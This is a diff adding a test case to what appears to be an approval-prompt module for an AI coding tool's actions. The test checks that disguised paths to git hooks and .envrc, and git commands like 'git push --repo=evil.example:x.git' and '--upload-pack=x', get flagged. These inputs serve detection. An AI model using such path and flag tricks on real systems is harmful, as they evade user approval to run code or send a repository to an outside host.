@@ -65,6 +65,13 @@ describe("approval words", () => {
     }
     expect(commandWords("git push origin feature/login").title).toBe("Send your saved versions to GitHub?");
   });
+  it("trailing dots, streams, short names, drive-relative paths and flag-borne remotes are caught", () => {
+    for (const p of [".git./hooks/pre-commit", ".git /hooks/x", ".git::$INDEX_ALLOCATION/hooks/x", "GIT~1/hooks/x", ".envrc."]) {
+      expect(approvalWords({ tool: "Edit", input: { file_path: `${root}/${p}` } }, root).title, p).toBe("Change how your project runs commands?");
+    }
+    expect(approvalWords({ tool: "Edit", input: { file_path: "C:secrets.txt" } }, "C:\\Users\\me\\app").title).toBe("Change a file outside this project?");
+    for (const c of ["git push --repo=evil.example:x.git", "git fetch --upload-pack=x origin"]) expect(commandWords(c, root), c).toEqual(unknown);
+  });
   it("git_push_force_is_risky", () => {
     expect(commandWords("git push").title).toBe("Send your saved versions to GitHub?");
     expect(commandWords("git push --force origin main").open).toBe(true);
